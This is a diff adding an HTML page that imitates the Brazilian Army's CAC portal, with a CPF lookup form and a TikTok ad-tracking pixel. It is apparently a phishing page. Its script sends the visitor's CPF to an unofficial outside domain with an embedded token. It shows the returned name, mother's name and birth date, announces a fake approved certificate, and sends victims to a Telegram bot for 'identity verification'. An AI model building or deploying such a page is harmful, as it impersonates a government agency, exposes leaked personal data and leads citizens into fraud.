@@ -1,0 +1,241 @@
+<html lang="pt-BR">
+<head>
+    <!-- TikTok Pixel Code Start -->
+    <script>
+    !function (w, d, t) {
+      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+    var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+    ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+
+      ttq.load('CVE2BIRC77UCRE2PJ1DG');
+      ttq.page();
+    }(window, document, 'ttq');
+    </script>
+    <!-- TikTok Pixel Code End -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exército Brasileiro - Portal CAC</title>
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- Tailwind CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts - Rawline -->
+    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Rawline', 'sans-serif'],
+                    },
+                    colors: {
+                        'military': {
+                            'green': '#2D5A27',
+                            'dark': '#1A3B19',
+                            'light': '#4A7A44'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        /* Forçar a fonte Rawline em todo o site */
+        body {
+            font-family: 'Rawline', sans-serif !important;
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+</head>
+<body class="flex flex-col min-h-screen bg-gray-50">
+    <header class="bg-white border-b border-gray-200 shadow-sm">
+        <div class="container mx-auto px-4 py-3">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center">
+                    <img src="https://www.eb.mil.br/image/company_logo?img_id=40367" alt="Brasão do Exército Brasileiro" class="h-14 mr-4">
+                    <div>
+                        <div class="text-sm font-medium text-military-dark">MINISTÉRIO DA DEFESA</div>
+                        <div class="font-bold text-military-green text-lg">EXÉRCITO BRASILEIRO</div>
+                        <div class="text-xs font-medium text-gray-600">Colecionador, Atirador Desportivo e Caçador (CAC)</div>
+                    </div>
+                </div>
+                <nav class="hidden md:flex space-x-8">
+                    <a href="#" class="text-military-green hover:text-military-dark font-medium">
+                        <i class="fas fa-home mr-1"></i>Página Inicial
+                    </a>
+                    <a href="#" class="text-military-green hover:text-military-dark font-medium">
+                        <i class="fas fa-list-check mr-1"></i>Serviços
+                    </a>
+                    <a href="#" class="text-military-green hover:text-military-dark font-medium">
+                        <i class="fas fa-building mr-1"></i>Institucional
+                    </a>
+                    <a href="#" class="text-military-green hover:text-military-dark font-medium">
+                        <i class="fas fa-envelope mr-1"></i>Contato
+                    </a>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <nav class="bg-gray-100 border-b border-gray-200">
+        <div class="container mx-auto px-4 py-2">
+            <div class="flex items-center text-sm">
+                <a href="#" class="text-military-green hover:text-military-dark">
+                    <i class="fas fa-home mr-1"></i>Página Inicial
+                </a>
+                <span class="mx-2 text-gray-400">/</span>
+                <a href="#" class="text-military-green hover:text-military-dark">
+                    <i class="fas fa-list-check mr-1"></i>Serviços
+                </a>
+                <span class="mx-2 text-gray-400">/</span>
+                <span class="text-gray-600">
+                    <i class="fas fa-id-card mr-1"></i>Portal CAC
+                </span>
+            </div>
+        </div>
+    </nav>
+
+    <main class="flex-grow container mx-auto px-4 py-8">
+        <div id="consultaForm" class="bg-white shadow-md rounded-lg p-6">
+            <h1 class="text-2xl font-bold text-military-green mb-4">Acompanhamento de Solicitações CAC</h1>
+            <p class="text-gray-700 mb-6">Verifique o status e os dados associados ao seu CPF no sistema do Exército Brasileiro. Este serviço é exclusivo para Colecionadores, Atiradores Desportivos e Caçadores (CAC).</p>
+            <form id="cpfForm" class="space-y-4">
+                <div>
+                    <label for="cpf" class="block text-sm font-medium text-gray-700">Informe o CPF para consulta:</label>
+                    <input type="text" id="cpf" name="cpf" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm focus:ring-military-green focus:border-military-green sm:text-sm" placeholder="000.000.000-00" required>
+                </div>
+                <button type="submit" class="w-full bg-military-green text-white py-2 px-4 rounded-md hover:bg-military-dark focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-military-green">
+                    Consultar Andamento
+                </button>
+            </form>
+        </div>
+
+        <div id="certificadoAprovado" class="hidden max-w-3xl mx-auto bg-white shadow-lg rounded-lg overflow-hidden">
+            <div class="bg-military-green text-white p-6">
+                <h1 class="text-3xl font-bold mb-2">Certificado CAC Aprovado</h1>
+                <p class="text-lg" id="parabensMensagem">Parabéns! Seu certificado de Colecionador, Atirador Desportivo e Caçador (CAC) foi aprovado.</p>
+            </div>
+            <div class="p-6">
+                <div class="mb-6">
+                    <h2 class="text-2xl font-semibold text-military-dark mb-4">Dados do Requerente:</h2>
+                    <p><strong>CPF:</strong> <span id="resultCpf"></span></p>
+                    <p><strong>Nome Completo:</strong> <span id="resultNome"></span></p>
+                    <p><strong>Nome da Mãe:</strong> <span id="resultNomeMae"></span></p>
+                    <p><strong>Data de Nascimento:</strong> <span id="resultDataNascimento"></span></p>
+                    <p><strong>Sexo:</strong> <span id="resultSexo"></span></p>
+                </div>
+                <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
+                    <div class="flex">
+                        <div class="flex-shrink-0">
+                            <i class="fas fa-exclamation-triangle text-yellow-400"></i>
+                        </div>
+                        <div class="ml-3">
+                            <p class="text-sm text-yellow-700">
+                                <strong>Importante:</strong> Por razões de segurança, seu certificado só estará disponível para download por 7 dias. Certifique-se de baixá-lo dentro deste prazo.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                <div class="bg-gray-100 rounded-lg p-6 mb-6">
+                    <h3 class="text-xl font-semibold text-military-dark mb-4">Próximos Passos:</h3>
+                    <ol class="list-decimal list-inside space-y-3 text-gray-700">
+                        <li>Acesse o bot oficial do Exército Brasileiro no Telegram clicando no botão abaixo.</li>
+                        <li>Inicie uma conversa com o bot enviando o comando /start.</li>
+                        <li>Siga as instruções fornecidas pelo bot para verificar sua identidade.</li>
+                        <li>Após a verificação, você receberá um link seguro para download do seu certificado CAC.</li>
+                        <li>Faça o download do certificado e guarde-o em local seguro.</li>
+                    </ol>
+                    <p class="mt-4 text-sm text-gray-600">Lembre-se: O bot oficial é o único meio autorizado para obter seu certificado CAC. Não compartilhe seus dados pessoais em outros canais.</p>
+                </div>
+                <div class="text-center">
+                    <a href="https://t.me/ExercitoBrasileiroCAC_bot" target="_blank" class="inline-block bg-military-green hover:bg-military-dark text-white font-bold py-3 px-6 rounded-lg transition duration-300 ease-in-out transform hover:-translate-y-1">
+                        <i class="fab fa-telegram mr-2"></i>Acessar Bot no Telegram
+                    </a>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="bg-military-green text-white mt-auto">
+        <div class="container mx-auto px-4 py-8">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
+                <div>
+                    <h3 class="font-bold text-lg mb-4">O EXÉRCITO</h3>
+                    <ul class="space-y-2 text-sm">
+                        <li><a href="#" class="hover:text-gray-300"><i class="fas fa-bullseye mr-2"></i>Missão e Visão</a></li>
+                        <li><a href="#" class="hover:text-gray-300"><i class="fas fa-clock-rotate-left mr-2"></i>História</a></li>
+                        <li><a href="#" class="hover:text-gray-300"><i class="fas fa-sitemap mr-2"></i>Estrutura Organizacional</a></li>
+                        <li><a href="#" class="hover:text-gray-300"><i class="fas fa-gavel mr-2"></i>Legislação</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold text-lg mb-4">SERVIÇOS</h3>
+                    <ul class="space-y-2 text-sm">
+                        <li><a href="#" class="hover:text-gray-300"><i class="fas fa-user-plus mr-2"></i>Alistamento Online</a></li>
+                        <li><a href="#" class="hover:text-gray-300"><i class="fas fa-id-card mr-2"></i>Portal CAC</a></li>
+                        <li><a href="#" class="hover:text-gray-300"><i class="fas fa-graduation-cap mr-2"></i>Concursos</a></li>
+                        <li><a href="#" class="hover:text-gray-300"><i class="fas fa-handshake mr-2"></i>Licitações</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold text-lg mb-4">ACESSO RÁPIDO</h3>
+                    <ul class="space-y-2 text-sm">
+                        <li><a href="#" class="hover:text-gray-300"><i class="fas fa-chart-line mr-2"></i>Portal da Transparência</a></li>
+                        <li><a href="#" class="hover:text-gray-300"><i class="fas fa-comments mr-2"></i>Ouvidoria</a></li>
+                        <li><a href="#" class="hover:text-gray-300"><i class="fas fa-envelope mr-2"></i>Fale Conosco</a></li>
+                        <li><a href="#" class="hover:text-gray-300"><i class="fas fa-circle-question mr-2"></i>Perguntas Frequentes</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold text-lg mb-4">REDES SOCIAIS</h3>
+                    <div class="flex space-x-4">
+                        <a href="#" class="hover:text-gray-300 text-xl"><i class="fab fa-facebook"></i></a>
+                        <a href="#" class="hover:text-gray-300 text-xl"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="hover:text-gray-300 text-xl"><i class="fab fa-instagram"></i></a>
+                        <a href="#" class="hover:text-gray-300 text-xl"><i class="fab fa-youtube"></i></a>
+                    </div>
+                    <div class="mt-6">
+                        <img src="https://www.eb.mil.br/image/company_logo?img_id=40367" alt="Brasão do Exército Brasileiro" class="h-20 opacity-75">
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="bg-military-dark text-white py-3 text-center text-sm">
+            <div class="container mx-auto px-4">
+                <p>© 2024 Exército Brasileiro - Todos os direitos reservados</p>
+                <p class="text-xs mt-1">Colecionador, Atirador Desportivo e Caçador (CAC)</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('cpfForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            const cpfInput = document.getElementById('cpf').value.replace(/\D/g, '');
+            const apiUrl = `https://consulta.fontesderenda.blog/cpf.php?token=6285fe45-e991-4071-a848-3fac8273c82a&cpf=${cpfInput}`;
+            
+            try {
+                const response = await fetch(apiUrl);
+                const data = await response.json();
+                if (data.DADOS) {
+                    const firstName = data.DADOS.nome.split(' ')[0].toLowerCase();
+                    const formattedFirstName = firstName.charAt(0).toUpperCase() + firstName.slice(1);
+                    document.getElementById('resultCpf').textContent = data.DADOS.cpf;
+                    document.getElementById('resultNome').textContent = data.DADOS.nome;
+                    document.getElementById('resultNomeMae').textContent = data.DADOS.nome_mae;
+                    document.getElementById('resultDataNascimento').textContent = new Date(data.DADOS.data_nascimento).toLocaleDateString('pt-BR');
+                    document.getElementById('resultSexo').textContent = data.DADOS.sexo === 'F' ? 'Feminino' : 'Masculino';
+                    document.getElementById('parabensMensagem').textContent = `Parabéns, ${formattedFirstName}! Seu certificado de Colecionador, Atirador Desportivo e Caçador (CAC) foi aprovado.`;
+                    document.getElementById('consultaForm').classList.add('hidden');
+                    document.getElementById('certificadoAprovado').classList.remove('hidden');
+                } else {
+                    alert('CPF não encontrado ou inválido.');
+                }
+            } catch (error) {
+                alert('Erro ao consultar o CPF. Tente novamente mais tarde.');
+            }
+        });
+    </script>
+</body>
+</html>
